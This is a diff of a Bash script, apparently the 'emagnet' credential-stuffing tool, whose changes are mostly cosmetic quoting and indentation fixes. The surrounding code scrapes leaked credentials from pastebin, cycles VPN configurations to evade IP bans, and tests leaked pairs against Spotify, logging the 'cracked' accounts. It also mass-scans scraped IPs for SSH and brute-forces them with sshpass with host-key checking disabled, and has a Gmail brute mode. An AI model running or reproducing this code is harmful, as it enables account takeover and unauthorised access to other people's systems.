@@ -255,12 +255,16 @@ curl -sL "$PASTEBIN" -H "$USERAGENT" \
 
 Iwasbanned() {
 . "$CONF"
+clear
+banner
 if [[ -z "$USERAGENT" ]]; then
 	echo -e "$basename$0: internal errror -- you must set a useragent in $CONF"
 	exit
 fi
 
-curl -sL "$PASTEBIN" -H "$USERAGENT"| grep -q "blocked your IP"
+ curl -sL "$PASTEBIN" -H "$USERAGENT" \
+|grep -q "blocked your IP"
+
 if [[ $? = "0" ]]; then
   if [[ $VPN = "false" ]]; then
    for (( ; ; )); do
@@ -294,31 +298,31 @@ VPNCONFIG=$(awk -F'/' '/VPNPROVIDER/ {print $2}' $CONF|cut -d'"' -f1|head -2|sed
 VPNCONFIG2=$(awk -F'/' '/VPNPROVIDER/ {print $2}' $CONF|cut -d'"' -f1|head -2|tail -1)
 VPNCONFIG3=$(awk -F'/' '/VPNPROVIDER/ {print $2}' $CONF|cut -d'"' -f1|head -3|tail -1)
 
-case $COUNTRY in
-   belgium)        cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.be.ovpn"      &> /dev/null & ;;
-   bulgaria)       cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.bg.ovpn"      &> /dev/null & ;;
-   czech)          cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.cz.ovpn"      &> /dev/null & ;;
-   denmark)        cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.dk.ovpn"      &> /dev/null & ;;
-   spain)          cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.es.ovpn"      &> /dev/null & ;;
-   finland)        cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.fi.ovpn"      &> /dev/null & ;;
-   united-kingdom) cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.gb.ovpn"      &> /dev/null & ;;
-   greece)         cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.gr.ovpn"      &> /dev/null & ;;
-   hongkong)       cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.hk.ovpn"      &> /dev/null & ;;
-   hungaria)       cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.hu.ovpn"      &> /dev/null & ;;
-   italy)          cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.it.ovpn"      &> /dev/null & ;;
-   moldavia)       cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.md.ovpn"      &> /dev/null & ;;
-   netherlands)    cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.nl.ovpn"      &> /dev/null & ;;
-   norway)         cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.no.ovpn"      &> /dev/null & ;;
-   poland)         cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.pl.ovpn"      &> /dev/null & ;;
-   portugal)       cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.pt.ovpn"      &> /dev/null & ;;
-   romania)        cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.ro.ovpn"      &> /dev/null & ;;
-   russia)         cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.rs.ovpn"      &> /dev/null & ;;
-   sweden)         cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.se.ovpn"      &> /dev/null & ;;
-   sweden1)        cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.se-got.ovpn"  &> /dev/null & ;;
-   sweden2)        cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.se-hel.ovpn"  &> /dev/null & ;;
-   sweden3)        cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.se-mma.ovpn"  &> /dev/null & ;;
-   sweden4)        cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.se-sto.ovpn"  &> /dev/null & ;;
-   united-states)  cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.us.ovpn"      &> /dev/null & ;;
+case "$COUNTRY" in
+   "belgium")        cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.be.ovpn"      &> /dev/null & ;;
+   "bulgaria")       cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.bg.ovpn"      &> /dev/null & ;;
+   "czech")          cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.cz.ovpn"      &> /dev/null & ;;
+   "denmark")        cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.dk.ovpn"      &> /dev/null & ;;
+   "spain")          cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.es.ovpn"      &> /dev/null & ;;
+   "finland")        cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.fi.ovpn"      &> /dev/null & ;;
+   "united-kingdom") cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.gb.ovpn"      &> /dev/null & ;;
+   "greece")         cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.gr.ovpn"      &> /dev/null & ;;
+   "hongkong")       cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.hk.ovpn"      &> /dev/null & ;;
+   "hungaria")       cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.hu.ovpn"      &> /dev/null & ;;
+   "italy")          cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.it.ovpn"      &> /dev/null & ;;
+   "moldavia")       cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.md.ovpn"      &> /dev/null & ;;
+   "netherlands")    cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.nl.ovpn"      &> /dev/null & ;;
+   "norway")         cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.no.ovpn"      &> /dev/null & ;;
+   "poland")         cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.pl.ovpn"      &> /dev/null & ;;
+   "portugal")       cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.pt.ovpn"      &> /dev/null & ;;
+   "romania")        cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.ro.ovpn"      &> /dev/null & ;;
+   "russia")         cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.rs.ovpn"      &> /dev/null & ;;
+   "sweden")         cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.se.ovpn"      &> /dev/null & ;;
+   "sweden1")        cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.se-got.ovpn"  &> /dev/null & ;;
+   "sweden2")        cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.se-hel.ovpn"  &> /dev/null & ;;
+   "sweden3")        cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.se-mma.ovpn"  &> /dev/null & ;;
+   "sweden4")        cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.se-sto.ovpn"  &> /dev/null & ;;
+   "united-states")  cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.us.ovpn"      &> /dev/null & ;;
 esac
 }
 
@@ -468,7 +472,7 @@ SPOTIFY_USER="$(echo $line|cut -d: -f1)"
 SPOTIFY_PASS="$(echo $line|cut -d: -f2)"
      ./sconsify -username="${SPOTIFY_USER}" <<< "${SPOTIFY_PASS}" 2> /dev/null|grep -i -q "bad"
           if [[ "$?" -eq "0" ]]; then
-             echo -e "[\e[1;31m<<\e[0m] - Wrong Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"
+              echo -e "[\e[1;31m<<\e[0m] - Wrong Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"
           else
               echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"
               echo -e "================================================================"     >>    "$EMAGNETLOGS/cracked-spotify-passwords.txt"
@@ -478,12 +482,11 @@ SPOTIFY_PASS="$(echo $line|cut -d: -f2)"
               echo -e "[+] Password: ${SPOTIFY_PASS}"                                        >>    "$EMAGNETLOGS/cracked-spotify-passwords.txt"
               echo -e "================================================================\n\n" >>    "$EMAGNETLOGS/cracked-spotify-passwords.txt"
           fi
-
-done < /tmp/.emagnet-passwords.txt
+done < "/tmp/.emagnet-passwords.txt"
 }
 
 sshbruter() {
-  hash parallel &> /dev/null
+  hash "parallel" &> /dev/null
 ( [[ "$?" -ne "0" ]] && echo -e "$basename$0: internal error -- parallel package is required to be installed.."; exit 1 )
 if [[ -z "$SSHPASS" ]]; then
    echo -e "You must set a password to use during the attack"
@@ -502,20 +505,20 @@ SKIPLIST="^0\|^[0-9].[0-9].[0-9].*\|^[0-9]\..*\|^10\..*\|^192.*\|^11.*"
 grep -Ewro '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' $EMAGNETHOME/.temp\
 |awk -F':' '{print $2}'\
 |sort\
-|grep -v $SKIPLIST\
+|grep -v "$SKIPLIST"\
 |awk -F, '!seen[$1]++'> $SSHPORTSCAN
 if [[ $(cat /tmp/.emagnet-portscan|wc -l) -eq "0" ]]; then
     printf "%17s[\e[1;31m\e[5m00\e[0m\e[0m] - Ipv4 Addresses found\n"
     sleep 2
 else
-    clear
-    banner
+      clear
+      banner
       echo -e "                  PORTSCANNING - BRUTEFORCING"
       printf "\n%64s" | tr ' ' '='
       printf "\nPort/Brute attack will be started within 2 seconds..............\n"
       printf "Please use (CTRL+C) to abort the scan at anytime................\n"
       printf "%64s\n" | tr ' ' '='
-    sleep 2
+     sleep 2
 parallel -j$THREADS -a /tmp/.emagnet-portscan '\
 timeout 0.5 nc -n -zv {} 22 > /dev/null 2>&1 |tee /tmp/.emagnet-sshbruter.txt 2>&1 grep open && \
 timeout 1 sshpass -p "$SSHPASS" ssh -v "-o StrictHostKeyChecking=no" $SSHUSER@{} pwd 2>&1 grep "Authenticated to" &> /dev/null
@@ -861,27 +864,27 @@ if [[ $2 = "gmail" ]]; then
         sed -i 's/GBRUTEFORCE=false/GBRUTEFORCE=true/g' "$CONF"
         conf
         if [[ $GBRUTEFORCE = "true" ]]; then
-        clear
-        banner
-        printf "%19s \e[1;31m$(echo -e "\e[1;34mG\e[1;31mM\e[1;33mA\e[1;34mi\e[0;32mL\e\e[0m") BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
-        printf "\n%64s \n\n" | tr ' ' '='
-        dontstopwhenfound
-        bruter
-        mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
+                clear
+                banner
+                printf "%19s \e[1;31m$(echo -e "\e[1;34mG\e[1;31mM\e[1;33mA\e[1;34mi\e[0;32mL\e\e[0m") BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
+                printf "\n%64s \n\n" | tr ' ' '='
+                dontstopwhenfound
+                bruter
+                mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
         fi
 elif [[ $2 = "ssh" ]]; then
         conf
         sed -i 's/SBRUTEFORCE=false/SBRUTEFORCE=true/g' "$CONF"
         conf
         if [[ $SBRUTEFORCE = "true" ]]; then
-        clear
-        banner
-        printf "%20s \e[1mSSH\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
-        printf "\n%64s \n\n" | tr ' ' '='
-        dontstopwhenfound
-        sshbruter
+                clear
+                banner
+                printf "%20s \e[1;34mSSH\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
+                printf "\n%64s \n\n" | tr ' ' '='
+                dontstopwhenfound
+                sshbruter
         fi
-        mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
+                mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
 elif [[ $2 = "spotify" ]]; then
          conf
          find /usr/include -type d |grep 'libspotify' &> /dev/null
@@ -907,14 +910,14 @@ elif [[ $2 = "spotify" ]]; then
            read -p "Download and install sconsify (y/N): " installsconsify
              if [[ "$installsconsify" -eq "y" ]]; then
                 echo -e "Hold on, downloading sconsify.."
-                wget -q "https://github.com/fabiofalci/sconsify/releases/download/next-20180428/linux-x86_64-sconsify-0.6.0-next.zip"
+                  wget -q "https://github.com/fabiofalci/sconsify/releases/download/next-20180428/linux-x86_64-sconsify-0.6.0-next.zip"
                 echo -e "Unzipping sconsify into current dir.."
-                unzip -q -o "linux-x86_64-sconsify-0.6.0-next.zip"
-                chmod +x ./sconsify
+                  unzip -q -o "linux-x86_64-sconsify-0.6.0-next.zip"
+                  chmod +x ./sconsify
                 echo -e "Cleaning up."..
-                rm "linux-x86_64-sconsify-0.6.0-next.zip"
+                  rm "linux-x86_64-sconsify-0.6.0-next.zip"
                 echo "All done, going to continue in 3 seconds.."
-                sleep 3
+                  sleep 3
         else
               echo -e "$basename$0: internal error -- sconsify is required to be installed.."
               exit 1
@@ -923,15 +926,15 @@ fi
         sed -i 's/PBRUTEFORCE=false/PBRUTEFORCE=true/g' "$CONF"
         conf
         if [[ "$PBRUTEFORCE" = "true" ]]; then
-        clear
-        banner
-        printf "%18s \e[0;32mSPOTIFY\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
-        printf "\n%64s \n\n" | tr ' ' '='
-        dontstopwhenfound
-        printf "\n%64s \n\n" | tr ' ' '='
-        spotifybruter
+                clear
+                banner
+                    printf "%18s \e[0;32mSPOTIFY\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
+                    printf "\n%64s \n\n" | tr ' ' '='
+                    dontstopwhenfound
+                printf "\n%64s \n\n" | tr ' ' '='
+            spotifybruter
         fi
-        mv "$EMAGNETTEMP/*" "$EMAGNETHOME/all-files" &> /dev/null
+            mv "$EMAGNETTEMP/*" "$EMAGNETHOME/all-files" &> /dev/null
 else
        printf "emagnet: internal error -- you must include ssh, spotify or gmail\n"
        exit 1
